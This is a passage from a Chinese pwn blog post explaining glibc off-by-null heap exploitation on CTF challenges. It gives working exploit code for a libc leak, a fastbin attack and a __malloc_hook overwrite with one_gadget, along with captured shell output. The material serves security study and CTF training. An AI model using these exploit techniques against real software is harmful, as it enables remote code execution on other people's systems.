class="number">3</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure>
<p><img alt="" data-src="/imgs/off-by-null-2.png" class="lozad"></p>
<p>下面释放掉 chunk 11</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 触发 overlap</span></span><br><span class="line">dele(<span class="number">11</span>)</span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure>
<p>系统发现 chunk 11 的 pre_size 为 0 ，即表明前一个 chunk 是释放状态，同时 chunk 11 和 top_chunk 相邻，所以 即使 chunk 11 的大小在 fastbin 的范围内也会触发合并操作，于是会通过 chunk 11 的 pre_size ( 0x210 ) 找到上面那个 smallbin 的起始地址。</p>
<p>然后对 smallbin 做 unlink 操作， 此时 smallbin 已经在链表上，所以 unlink 可以通过，拆下来后进行合并， 合并之后形成了一个大 chunk.<br><img alt="" data-src="/imgs/off-by-null-3.png" class="lozad"></p>
<p>这个 chunk 会继续和 top_chunk 合并变成 top_chunk 的一部分。注意到此时 chunk4 - chunk8 已经落入 top_chunk 里。</p>
<p>接下来通过类似的方法，分配多个 chunk ， 然后释放掉中间的一些的 chunk , 然后出发 堆合并，构造一个比较大的 smallbin<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">add(0x28, &apos;a&apos;)  # 1</span><br><span class="line">add(0x28, &apos;a&apos;)  # 2</span><br><span class="line">add(0x18, &apos;a&apos;)  # 3</span><br><span class="line">add(0x18, &apos;a&apos;)  # 9</span><br><span class="line">add(0x38, &apos;1&apos; * 0x30)  # 10</span><br><span class="line">add(0x38, &apos;2&apos; * 0x30)  # 11</span><br><span class="line">add(0x28, &apos;3&apos; * 0x30)  # 12</span><br><span class="line">add(0x38, &apos;4&apos; * 0x30)  # 13</span><br><span class="line">add(0x38, &apos;5&apos; * 0x30)  # 14</span><br><span class="line">pay = &apos;a&apos; * 0x20 + p64(0x200) + p64(0x20)</span><br><span class="line">add(0x38, pay)  # 15</span><br><span class="line"></span><br><span class="line">add(0x38, &apos;end&apos;)  # 16</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dele(1)</span><br><span class="line">dele(2)</span><br><span class="line">dele(3)</span><br><span class="line">for i in range(9, 16):</span><br><span class="line">    dele(i)</span><br><span class="line"></span><br><span class="line">triger_consolidate()</span><br></pre></td></tr></table></figure></p>
<p>此时的内存状态如图</p>
<p><img alt="" data-src="/imgs/off-by-null-4.png" class="lozad"></p>
<p>此时 chunk 4 - chunk 8 落入了新构造的 smallbin 里面。下面通过 不断的分配，会对这个 smallbin 进行切割，这个过程就会使得 一些链表用的指针落入到 还处于 使用状态的 chunk4 - chunk8 的某一个 chunk 里面， 然后利用 puts 功能，就可以打印指针的内容，造成信息泄露， 拿到 libc 的地址。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment">### 构造好 unsorted bin ，下面通过不断切割，让指针落入 overlap chunk 里面， 然后 Puts leak 出来</span></span><br><span class="line"></span><br><span class="line">dele(<span class="number">0</span>)</span><br><span class="line">pay = <span class="string">'a'</span> * <span class="number">0x38</span></span><br><span class="line">add(<span class="number">0x38</span>, pay)  <span class="comment"># 0</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###  再次 shrink chunk 利用切割smallbin遗留下的指针，leak libc</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span> * <span class="number">8</span>)  <span class="comment"># 1</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'b'</span> * <span class="number">8</span>)  <span class="comment"># 2</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'c'</span> * <span class="number">8</span>)  <span class="comment"># 3</span></span><br><span class="line"></span><br><span class="line">view(<span class="number">4</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">lbase = u64(p.recvuntil(<span class="string">'\n'</span>)[:<span class="number">-1</span>].ljust(<span class="number">8</span>, <span class="string">'\x00'</span>)) - <span class="number">0x3c4b20</span> - <span class="number">88</span></span><br><span class="line">success(<span class="string">'lbase: '</span> + hex(lbase))</span><br></pre></td></tr></table></figure>
<h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>能够 overlap chunk 后实现 getshell 的方式就很多了，下面 分析下 exp 的 getshell 方案。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># fastbin dup, 利用 overlap chunk 和 fastbin 的机制往  main_arena 写 size 0x41</span></span><br><span class="line"><span class="comment"># 然后利用 fastbin attack 控制 main_arena-&gt;top.</span></span><br><span class="line">dele(<span class="number">5</span>)</span><br><span class="line">dele(<span class="number">14</span>)</span><br><span class="line">dele(<span class="number">0xc</span>)</span><br><span class="line"></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">15</span>)</span><br><span class="line">dele(<span class="number">0xd</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 修改fastbin的fd为0x41,然后分配几次，让main_arean里面有0x41</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x28</span>, <span class="string">'a'</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment"># 利用之前在main_arean里面设置的0x41作为size分配到main_arean,然后修改top_chunk的地址为__malloc_hook-0x18</span></span><br><span class="line">add(<span class="number">0x38</span>, p64(lbase + <span class="number">0x3c4b20</span> + <span class="number">8</span> + <span class="number">0x20</span>) + <span class="string">'\x00'</span> * <span class="number">0x10</span> + p64(<span class="number">0x41</span>))</span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">'\x00'</span> * <span class="number">0x20</span> + p64(lbase + libc.sym[<span class="string">'__malloc_hook'</span>] - <span class="number">0x18</span>))</span><br></pre></td></tr></table></figure>
<ul>
<li>利用 overlap chunk 和 fastbin 的机制往 main_arena 写 size (0x41)</li>
<li>然后利用 fastbin attack 控制 main_arena-&gt;top<br>然后就可以分配到 malloc_hook 附近，修改 malloc_hook 为 one_gadget.</li>
</ul>
<p>最后利用 malloc_printerr 触发 one_gadget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 此时 chunk 6 和 chunk 8 在 tbl 的指针一样，触发 double free</span></span><br><span class="line"><span class="comment"># malloc_printerr ---&gt; malloc_hook ---&gt; getshell</span></span><br><span class="line">dele(<span class="number">6</span>)</span><br><span class="line">dele(<span class="number">8</span>)</span><br></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[*] Switching to interactive mode</span><br><span class="line"> [DEBUG] Received 0x5b bytes:</span><br><span class="line">    &quot;*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***\n&quot;</span><br><span class="line">*** Error in `heapstrom_zero&apos;: double free or corruption (fasttop): 0x0000000000603200 ***</span><br><span class="line">$ id</span><br><span class="line">[DEBUG] Sent 0x3 bytes:</span><br><span class="line">    &apos;id\n&apos;</span><br><span class="line">[DEBUG] Received 0x84 bytes:</span><br><span class="line">    00000000  75 69 64 3d  31 30 30 30  28 6a 69 6e  67 29 20 67  │uid=│1000│(jin│g) g│</span><br><span class="line">    00000010  69 64 3d 31  30 30 30 28  6a 69 6e 67  29 20 e7 bb  │id=1│000(│jing│) ··│</span><br><span class="line">    00000020  84 3d 31 30  30 30 28 6a  69 6e 67 29  2c 34 28 61  │·=10│00(j│ing)│,4(a│</span><br><span class="line">    00000030  64 6d 29 2c  32 34 28 63  64 72 6f 6d  29 2c 32 37  │dm),│24(c│drom│),27│</span><br><span class="line">    00000040  28 73 75 64  6f 29 2c 33  30 28 64 69  70 29 2c 34  │(sud│o),3│0(di│p),4│</span><br><span class="line">    00000050  36 28 70 6c  75 67 64 65  76 29 2c 31  31 33 28 6c  │6(pl│ugde│v),1│13(l│</span><br><span class="line">    00000060  70 61 64 6d  69 6e 29 2c  31 32 38 28  73 61 6d 62  │padm│in),│128(│samb│</span><br><span class="line">    00000070  61 73 68 61  72 65 29 2c  39 39 39 28  64 6f 63 6b  │asha│re),│999(│dock│</span><br><span class="line">    00000080  65 72 29 0a                                         │er)·││</span><br><span class="line">    00000084</span><br><span class="line">uid=1000(jing) gid=1000(jing) 组=1000(jing),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare),999(docker)</span><br></pre></td></tr></table></figure>
<h2 id="另一种布局"><a href="#另一种布局" class="headerlink" title="另一种布局"></a>另一种布局</h2><p>为进一步理解 off by null , 下面以另一个 exp 的信息泄露过程为例介绍下堆的布局</p>
<p>来源 <a href="https://xz.aliyun.com/t/3253#toc-2" target="_blank" rel="noopener">https://xz.aliyun.com/t/3253#toc-2</a><br>首先分配若干个 chunk , 释放掉其中的第一个 chunk ，利用 scanf 触发堆合并构造 smallbin<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">"AAA\n"</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">24</span>):</span><br><span class="line">    add(<span class="number">0x38</span>, <span class="string">"A"</span> * <span class="number">8</span> + str(i) + <span class="string">"\n"</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">6</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 触发堆合并， 构造 2 个 ， smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure></p>
<p>此时 chunk 10 的 pre_size 为 0x180 , pre_inused = 0.</p>
<p><img alt="" data-src="/imgs/off-by-null-5.png" class="lozad"><br>图中颜色定义如下<br><img alt="" data-src="/imgs/off-by-null-6.png" class="lozad"></p>
<p>然后分配一个 0x40 的 chunk , 此时会用 0x180 大小的 smallbin 分配，分配后应该剩下 0x140 大小的 unsorted bin (bin 切割后会保存在 unsorted bin ) , 然后利用 off by null , 修改 unsorted bin 的大小为 0x100. 此时会出现 0x40 的空隙。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="comment"># 分配比较大的内存，使用较大的 smallbin , 分配完后利用 off by null</span></span><br><span class="line"><span class="comment"># shrink unsorted bin 的大小</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"B"</span> * <span class="number">0x30</span> + p64(<span class="number">0x120</span>))</span><br></pre></td></tr></table></figure>
<p><img alt="" data-src="/imgs/off-by-null-7.png" class="lozad"></p>
<p>下面在分配两个 chunk (4 5) , 然后释放 chunk 4 , 在利用 堆合并 将 fastbin 放入 smallbin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 构造 smallbin 为 合并时的 unlink 做准备</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"C"</span> * <span class="number">0x30</span> + p32(<span class="number">0x40</span>) + <span class="string">'\n'</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"P"</span> * <span class="number">0x30</span> + <span class="string">'\n'</span>)  <span class="comment"># 5</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="comment"># 触发堆合并，形成 smallbin</span></span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
<p><img alt="" data-src="/imgs/off-by-null-8.png" class="lozad"></p>
<p>然后把 chunk 10 释放掉， 此时系统根据 chunk 10 的 pre_size 找到 smallbin 的位置进行合并， 由于 smallbin 此时已经在链表中，所以可以成功完成合并过程中的 unlink 操作， 然后会得到一个很大的 smallbin</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 释放 chunk 10, 同时触发堆合并，形成 overlap chunk , 测试 chunk 5 被 overlap</span></span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line">sla(<span class="string">"Choice:"</span>, <span class="string">"1"</span> * <span class="number">0x500</span>)</span><br></pre></td></tr></table></figure>
<p>此时的内存布局如下图<br><img alt="" data-src="/imgs/off-by-null-9.png" class="lozad"></p>
<p>通过合并我们得到了一个 0x180 大小的 smallbin , 在这个大 smallbin 里面有一个还在使用的 chunk 5 , 同时还有之前分配剩下的 0x80 大小的 smallbin. 这样我就得到了 overlap heap.</p>
<p>下面新建 3 个 chunk</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x38</span>, <span class="string">"DDD\n"</span>)  <span class="comment"># 4</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"KKK\n"</span>)  <span class="comment"># 6</span></span><br><span class="line">add(<span class="number">0x38</span>, <span class="string">"EEE\n"</span>)  <span class="comment"># 7</span></span><br></pre></td></tr></table></figure>
<p>由于malloc 分配内存的机制，会先从 0x80 的 smallbin 里面分配，然后才会去 0x180 的 smallbin 分配，所以内存布局如图。</p>
<p><img alt="" data-src="/imgs/off-by-null-10.png" class="lozad"></p>
<p>分配完成后 chunk 5 变成了 0x140 大小的 unsorted bin 的起始位置，于是可以利用 Puts 功能把 unsorted bin 的 指针打印出来， leak libc</p>
<h2 id="Tcache下的利用"><a href="#Tcache下的利用" class="headerlink" title="Tcache下的利用"></a>Tcache下的利用</h2><p>这是 lctf 的 easyheap , 用的是 libc 2.27 , 已经使用了 tcache</p>
<p>题目地址:<br><a href="https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap" target="_blank" rel="noopener">https://gitee.com/hac425/blog_data/blob/master/off_by_null/easy_heap</a> </p>
<p>题目分析</p>
<p>程序逻辑比较简单，漏洞位于 分配内存后，写内存时，如果 设置要 size 为 0xf8 就会 在 buf[0xf8] 写入一个字节。而 buf 是 0xf8 大小， 会有一字节的溢出。</p>
</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">nocbtm</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://nocbtm.github.io/2020/02/25/off-by-null/">https://nocbtm.github.io/2020/02/25/off-by-null/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://nocbtm.github.io">nocbtm's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/pwn/">pwn    </a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script></div></div><div class="post-reward"><a class="reward-button"><i class="fa fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/wechatpay.png"><div class="post-qr-code__desc">微信</div></li><li class="reward-item"><img class="lozad post-qr-code__img" src="/img/alipay.png"><div class="post-qr-code__desc">支付宝</div></li></ul></div></a></div><nav class="pagination_post" id="pagination"><div class="prev-post pull-left"><a href="/2020/03/05/malloc源码简单分析/"><img class="prev_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">上一篇</div><div class="prev_info"><span>malloc源码简单分析</span></div></a></div><div class="next-post pull-right"><a href="/2020/02/25/unlink/"><img class="next_cover lozad" data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'"><div class="label">下一篇</div><div class="next_info"><span>unlink</span></div></a></div></nav><div class="relatedPosts"><div class="relatedPosts_headline"><i class="fa fa-fw fa-thumbs-up" aria-hidden="true"></i><span> 相关推荐</span></div><div class="relatedPosts_list"><div class="relatedPosts_item"><a href="/2020/02/20/-fini-array段劫持/" title=".fini_array段劫持"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">.fini_array段劫持</div></a></div><div class="relatedPosts_item"><a href="/2019/10/14/2019-RoarCTF-pwn-writeup/" title="2019 RoarCTF pwn writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">2019 RoarCTF pwn writeup</div></a></div><div class="relatedPosts_item"><a href="/2019/11/01/360杯-pwn-writeup/" title="360杯 pwn writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">360杯 pwn writeup</div></a></div><div class="relatedPosts_item"><a href="/2020/02/22/2020-i春秋公益赛pwn-writeup/" title="2020 i春秋公益赛pwn writeup"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">2020 i春秋公益赛pwn writeup</div></a></div><div class="relatedPosts_item"><a href="/2019/10/11/OGeekCTF-2019-部分-writeups/" title="OGeekCTF 2019 部分 writeups"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">OGeekCTF 2019 部分 writeups</div></a></div><div class="relatedPosts_item"><a href="/2020/03/06/free源码简单分析/" title="free源码简单分析"><img class="relatedPosts_cover lozad"data-src="https://cdn.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png"><div class="relatedPosts_title">free源码简单分析</div></a></div></div><div class="clear_both"></div></div></div></div><footer><div id="footer"><div class="copyright">&copy;2018 - 2020 By nocbtm</div><div class="framework-info"><span>驱动 </span><a href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>主题 </span><a href="https://github.com/jerryc127/hexo-theme-butterfly"><span>Butterfly</span></a></div><div class="icp"><a><img class="icp-icon" src="/img/icp.png"><span></span></a></div></div></footer></div><section class="rightside" id="rightside"><div id="rightside-config-hide"><i class="fa fa-book" id="readmode" title="阅读模式"></i><i class="fa fa-plus" id="font_plus" title="放大字体"></i><i class="fa fa-minus" id="font_minus" title="缩小字体"></i><a class="translate_chn_to_cht" id="translateLink" href="javascript:translatePage();" title="简繁转换">繁</a><i class="nightshift fa fa-moon-o" id="nightshift" title="夜间模式"></i></div><div id="rightside-config-show"><div id="rightside_config" title="设置"><i class="fa fa-cog" aria-hidden="true"></i></div><a id="to_comment" href="#post-comment" title="直达评论"><i class="scroll_to_comment fa fa-comments">  </i></a><i class="fa fa-list-ul close" id="mobile-toc-button" title="目录" aria-hidden="true"></i><i class="fa fa-arrow-up" id="go-up" title="回到顶部" aria-hidden="true"></i></div></section><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/js-cookie@2/src/js.cookie.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="/js/nightshift.js"></script><script src="/js/baidupush.js"> </script><script src="/js/activate-power-mode.js"></script><script>POWERMODE.colorful = true; // make power mode colorful
POWERMODE.shake = true; // turn off shake
document.body.addEventListener('input', POWERMODE);
</script><script src="/js/tw_cn.js"></script><script>translateInitilization()

</script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page@1.2.2/instantpage.min.js" type="module"></script><script src="https://cdn.jsdelivr.net/npm/lozad/dist/lozad.min.js"></script><script>const observer = lozad(); // lazy loads elements with default selector as '.lozad'
observer.observe();
</script><script src="/live2dw/lib/L2Dwidget.min.js?0c58a1486de42ac6cc1c59c7d98ae887"></script><script>L2Dwidget.init({"model":"wanko","mobileShow":false,"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body></html>